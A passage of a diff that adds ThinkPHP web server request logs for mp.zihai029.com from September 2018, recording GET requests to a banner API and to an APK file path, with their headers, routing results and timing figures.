+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:34:09+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014379s][吞吐率：69.55req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T18:03:45+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014391s][吞吐率：69.49req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T18:45:25+08:00 ] 172.17.0.24 106.11.223.18 GET /%E6%80%A5%E9%80%9F-1.apk.1.1.1
+[ info ] mp.zihai029.com/%E6%80%A5%E9%80%9F-1.apk.1.1.1 [运行时间：0.013832s][吞吐率：72.30req/s] [内存消耗：1,643.64kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '急速-1.apk.1.1.1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'mp.zihai029.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2307.2 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T18:45:25+08:00 ] 172.17.0.24 106.11.223.18 GET /%E6%80%A5%E9%80%9F-1.apk.1.1.1
+[ info ] mp.zihai029.com/%E6%80%A5%E9%80%9F-1.apk.1.1.1 [运行时间：0.013708s][吞吐率：72.95req/s] [内存消耗：1,643.66kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'mp.zihai029.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2307.2 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
